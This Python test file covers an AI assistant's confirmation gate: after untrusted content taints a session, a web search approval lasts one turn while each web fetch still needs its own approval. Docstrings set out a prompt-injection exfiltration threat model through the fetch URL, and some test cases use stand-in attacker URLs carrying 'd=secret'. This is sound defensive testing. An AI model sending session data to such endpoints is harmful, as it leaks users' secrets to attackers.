# tests/test_turn_grant.py
"""
DEC-143 — `web__search` is approved for a TURN; `web__fetch` stays PER CALL.

THE RULING'S SHAPE, AS BUILT. Taint asks; the grant answers. An approval of a
tool in `TURN_GRANTED_TOOLS` — exactly ONE member, by ruling — becomes a GRANT for
that tool for the rest of the turn that carried the approval: held in its own
record BESIDE the pending and never inside it, released by tool NAME with the
arguments unread, and ended at the next turn boundary. Every other high-impact
tool keeps DEC-16's per-call binding (its twins live in `test_confirm_gate.py`).

WHY SEARCH AND NOT FETCH (DEC-143 ③). Search reaches ONE configured provider — the
trust every clean-session search already extends — and every path to an
attacker-chosen endpoint runs through fetch. The split IS the safety argument, so
the case that pins it — a search grant never releases a fetch — is here and in
`test_kernel_spoken_request.py`.

Each property below is mutation-verified (the commit records them): a grant that
survives `new_turn()`, a search grant that releases a fetch, and a grant kept
inside the pending slot each turn a test RED.

Run:  set PYTHONPATH=src && python -m pytest tests/test_turn_grant.py -q
"""

from __future__ import annotations

import asyncio
import inspect
import logging

from muthis.kernel.highlight_gate import HighlightGate, loop_tool_choice
from muthis.kernel.session_taint import SessionTaint
from muthis.kernel.tool_router import ToolRouter, namespaced_name
from muthis.trust.call_binding import canonical_call
from muthis.trust.confirm_gate import TURN_GRANTED_TOOLS, ConfirmGate
from muthis.trust.confirm_gate_detector import (
    APPROVAL_WORD_AR, APPROVAL_WORDS_AR, APPROVE as APPROVED, detect_confirmation,
)
from muthis.trust.confirm_gate_notes import (
    CONFIRM_DIRECTIVE_AR, PER_CALL_BINDING_AR, TURN_SCOPE_AR, confirm_note,
)
from muthis.trust.confirm_gate_speech import (
    SPOKEN_REQUEST_AR, SPOKEN_SCOPE_AR, spoken_request, spoken_scope,
)
from muthis.trust.confirm_gate_state import GateState
from muthis.trust.high_impact import NETWORK_CAPABILITY, RouteImpact
from muthis_sdk import ToolDescriptor, ToolPlugin, ToolResult

SEARCH = namespaced_name("web", "search")
FETCH = namespaced_name("web", "fetch")
APPROVE = APPROVAL_WORDS_AR[0]


class _Web(ToolPlugin):
    """The production shape: ONE plugin, BOTH tools, ONE `RouteImpact(net.fetch)`."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, dict]] = []

    def descriptors(self):
        return [ToolDescriptor(name=n, schema={"name": n, "description": "d", "input_schema": {}},
                               kernel_serviced=False) for n in ("search", "fetch")]

    async def execute(self, tool, args, ctx):
        self.calls.append((tool, dict(args)))
        return ToolResult(text_ar="نتيجة")


def _router() -> tuple[ToolRouter, _Web]:
    plugin = _Web()
    router = ToolRouter()
    router.mount(plugin, namespace="web", provenance="web:test", taint=True,
                 impact=RouteImpact(capabilities=frozenset({NETWORK_CAPABILITY})))
    router.session_taint.raise_taint("web:test")
    return router, plugin


def _call(router, tool, args):
    return asyncio.run(router.service(tool, dict(args)))


def _turn(router, text=APPROVE):
    router.confirm_gate.new_turn()
    router.confirm_gate.observe(text)


def _granted_search_router():
    router, plugin = _router()
    _call(router, SEARCH, {"query": "بايثون"})         # turn N: refused
    _turn(router)                                      # turn N+1: approved
    return router, plugin


# ─── The class: ONE member, by ruling ────────────────────────────────────────

def test_the_turn_granted_class_has_exactly_ONE_member():
    """A tool that drifts into this set without a ruling is the defect DEC-143
    names. The key is DERIVED through DEC-11's one separator."""
    assert TURN_GRANTED_TOOLS == frozenset({namespaced_name("web", "search")})
    assert FETCH not in TURN_GRANTED_TOOLS


# ─── The grant ───────────────────────────────────────────────────────────────

def test_a_search_approval_releases_EVERY_search_in_its_turn():
    router, plugin = _granted_search_router()
    for args in ({"query": "حسابي البنكي"}, {"query": "x", "max_results": 3},
                 {"query": "بايثون"}, {"query": "بايثون"}):
        assert _call(router, SEARCH, args).result.is_error is False, args
    assert len(plugin.calls) == 4


def test_the_grant_ENDS_at_the_next_turn_boundary():
    """Not open-ended permission: `new_turn()` ends it, whatever the next
    utterance is — and an approval word in the NEXT turn cannot revive it, because
    nothing is pending to approve."""
    router, plugin = _granted_search_router()
    assert _call(router, SEARCH, {"query": "a"}).result.is_error is False
    router.confirm_gate.new_turn()
    assert _call(router, SEARCH, {"query": "a"}).result.is_error is True, (
        "a search grant outlived its turn")
    router, plugin = _granted_search_router()
    _turn(router)                                      # the word, again, in the NEXT turn
    assert _call(router, SEARCH, {"query": "b"}).result.is_error is True, (
        "a repeated approval word revived a grant with nothing pending")


def test_a_search_grant_NEVER_releases_a_fetch():
    """THE SPLIT. Fetch is the one path to an attacker-chosen endpoint."""
    router, plugin = _granted_search_router()
    outcome = _call(router, FETCH, {"url": "https://attacker.example/?d=secret"})
    assert outcome.result.is_error is True and outcome.provenance == "kernel:confirm"
    assert plugin.calls == [], "a search grant released a fetch"


def test_the_grant_lives_BESIDE_the_pending_and_survives_a_refused_fetch():
    """A fetch refused inside a granted turn REPLACES the pending slot. Kept inside
    that slot, the grant would die with it and the treadmill would return."""
    router, plugin = _granted_search_router()
    assert _call(router, FETCH, {"url": "https://a.test/"}).result.is_error is True
    assert router.confirm_gate.pending_tool == FETCH
    assert _call(router, SEARCH, {"query": "بعد الرفض"}).result.is_error is False, (
        "the refused fetch destroyed the search grant — it was kept inside the pending")


def test_a_search_approval_lifts_the_brake_and_leaves_nothing_pending():
    router, _plugin = _granted_search_router()
    gate = router.confirm_gate
    assert gate.pending_tool is None and gate.awaiting_approval is False
    assert loop_tool_choice(HighlightGate(), gate) == "auto"


def test_taint_and_grant_are_held_independently():
    """Taint asks; the grant answers — neither holds the other. The state has no
    taint, the taint has no gate, and the router joins them at ONE call site."""
    assert not any("taint" in name for name in vars(GateState()))
    assert not any("gate" in name or "grant" in name for name in vars(SessionTaint()))
    assert "tainted" in inspect.signature(ConfirmGate.refusal_for).parameters


# ─── What is SPOKEN and what is SAID ─────────────────────────────────────────

def test_a_search_is_asked_for_by_its_SCOPE_never_its_arguments():
    """DEC-138's defect in reverse is voicing ONE call while authorising a CLASS.
    The scope sentence is built from the tool the grant is held under and ONE
    word (DEC-147 ①) — and it CANNOT take arguments: that is its signature."""
    gate = ConfirmGate()
    gate.refusal_for(SEARCH, {"query": "حسابي البنكي"}, high_impact=True, tainted=True)
    said = gate.take_spoken_request()
    assert said == spoken_scope(SEARCH, APPROVAL_WORD_AR)
    assert SEARCH in said and "حسابي البنكي" not in said
    assert list(inspect.signature(spoken_scope).parameters) == ["tool", "word"]


def test_a_fetch_still_speaks_exactly_the_bytes_it_hashed():
    """Per call, DEC-138 is intact: the sentence is rendered from the canonical
    bytes the fingerprint covers."""
    args = {"url": "https://a.test/?q=1"}
    gate = ConfirmGate()
    gate.refusal_for(FETCH, args, high_impact=True, tainted=True)
    canonical, _ = canonical_call(FETCH, args)
    assert gate.take_spoken_request() == spoken_request(FETCH, canonical, APPROVAL_WORDS_AR)


def test_the_per_call_form_offers_EVERY_word_and_the_search_form_ONE():
    """FLIPPED DELIBERATELY BY DEC-147 ①. This test held both spoken forms to one
    words clause (DEC-136 ruling 2). The search request now offers ONE accepted
    word; the per-call request still offers every one, so a fetch is unchanged.
    Matched as «quoted» forms, because «وافق» is a substring of the other two."""
    per_call = spoken_request(FETCH, canonical_call(FETCH, {"url": "u"})[0],
                              APPROVAL_WORDS_AR)
    search = spoken_scope(SEARCH, APPROVAL_WORD_AR)
    assert [w for w in APPROVAL_WORDS_AR if f"«{w}»" in per_call] == list(APPROVAL_WORDS_AR)
    assert [w for w in APPROVAL_WORDS_AR if f"«{w}»" in search] == [APPROVAL_WORD_AR]


def test_the_search_request_names_ONE_word_and_the_detector_accepts_all_four():
    """DEC-147 ①, through the REAL gate: the search request offers exactly ONE
    accepted word, so saying the word it names approves — and the three it does
    not name are still accepted, as silent tolerance."""
    gate = ConfirmGate()
    gate.refusal_for(SEARCH, {"query": "x"}, high_impact=True, tainted=True)
    said = gate.take_spoken_request()
    offered = [w for w in APPROVAL_WORDS_AR if f"«{w}»" in said]
    assert offered == [APPROVAL_WORD_AR], f"the search request offered {offered}"
    for word in APPROVAL_WORDS_AR:
        assert detect_confirmation(word) == APPROVED, f"«{word}» is no longer accepted"


def test_the_search_request_says_WHY_and_never_WHAT_happened():
    """DEC-147 ①: the gate speaks only under taint, so "content from sources we
    do not trust has entered this session" is true every time it is spoken —
    where "I already searched" would sometimes lie: the taint keeps no source.
    Measured 292 → 157 characters; growing it back is a re-ruling."""
    said = spoken_scope(SEARCH, APPROVAL_WORD_AR)
    assert said.startswith("دخلت هذه الجلسة نصوصٌ من مصادر لا نثق فيها"), said
    assert SPOKEN_SCOPE_AR.startswith("دخلت هذه الجلسة")
    assert "بحثت" not in said and "وقفت" not in said, "the request claims what happened"
    assert "وحدها" in said, "the bare-word rule is no longer taught"
    assert len(said) <= 157, f"the search request grew back to {len(said)} characters"


def test_a_fetch_request_is_NOT_shortened():
    """DEC-147 ④: a fetch's path and query are the exfiltration channel, so its
    request still speaks the whole argument and offers every accepted word."""
    gate = ConfirmGate()
    gate.refusal_for(FETCH, {"url": "https://attacker.test/collect?d=secret"},
                     high_impact=True, tainted=True)
    said = gate.take_spoken_request()
    assert "/collect?d=secret" in said, "the path and query were not spoken"
    assert [w for w in APPROVAL_WORDS_AR if f"«{w}»" in said] == list(APPROVAL_WORDS_AR)
    assert "{words}" in SPOKEN_REQUEST_AR and "{args}" in SPOKEN_REQUEST_AR


def test_the_notes_tell_the_truth_under_the_split():
    """Ruling ③: the notes shipped WITH the grant. Per call keeps its sentence of
    old; a turn-granted tool states its scope; and the stop no longer claims every
    outward tool is stopped NOW, because one may be granted."""
    args = {"query": "x"}
    search_retry = confirm_note(SEARCH, args, APPROVAL_WORDS_AR, missed=True, scoped=True)
    fetch_retry = confirm_note(FETCH, {"url": "u"}, APPROVAL_WORDS_AR, missed=True)
    assert TURN_SCOPE_AR in search_retry and PER_CALL_BINDING_AR not in search_retry
    assert PER_CALL_BINDING_AR in fetch_retry and TURN_SCOPE_AR not in fetch_retry
    assert PER_CALL_BINDING_AR == "فالإذن مرتبط بهذا الاستدعاء بعينه لا بغيره."
    search_first = confirm_note(SEARCH, args, APPROVAL_WORDS_AR, missed=False, scoped=True)
    fetch_first = confirm_note(FETCH, {"url": "u"}, APPROVAL_WORDS_AR, missed=False)
    assert TURN_SCOPE_AR in search_first and TURN_SCOPE_AR not in fetch_first
    assert "موقوفة الآن" not in CONFIRM_DIRECTIVE_AR
    assert "ما لم يأذن بها المستخدم" in CONFIRM_DIRECTIVE_AR


def test_the_gate_chooses_the_scoped_note_for_search_alone():
    """The gate decides `scoped`; the notes only say it."""
    gate = ConfirmGate()
    assert TURN_SCOPE_AR in gate.refusal_for(SEARCH, {"query": "x"}, high_impact=True, tainted=True)
    gate = ConfirmGate()
    assert TURN_SCOPE_AR not in gate.refusal_for(FETCH, {"url": "u"}, high_impact=True, tainted=True)


# ─── The log lines the live check reads ──────────────────────────────────────

def test_the_live_check_can_read_the_grant_in_the_log(caplog):
    """Sultan verifies DEC-143 live from the durable log: the approval line is the
    one every prior analysis counted, and each grant release is its own line."""
    secret = "سرّ-لا-يُسجَّل-143"
    with caplog.at_level(logging.INFO, logger="muthis.trust.confirm_gate"):
        router, _plugin = _granted_search_router()
        _call(router, SEARCH, {"query": secret})
    text = caplog.text
    assert "[confirm-gate] approval heard for web__search" in text
    assert "[confirm-gate] granted call released: web__search" in text
    assert secret not in text, "a search argument reached the log (DEC-20/DEC-28)"
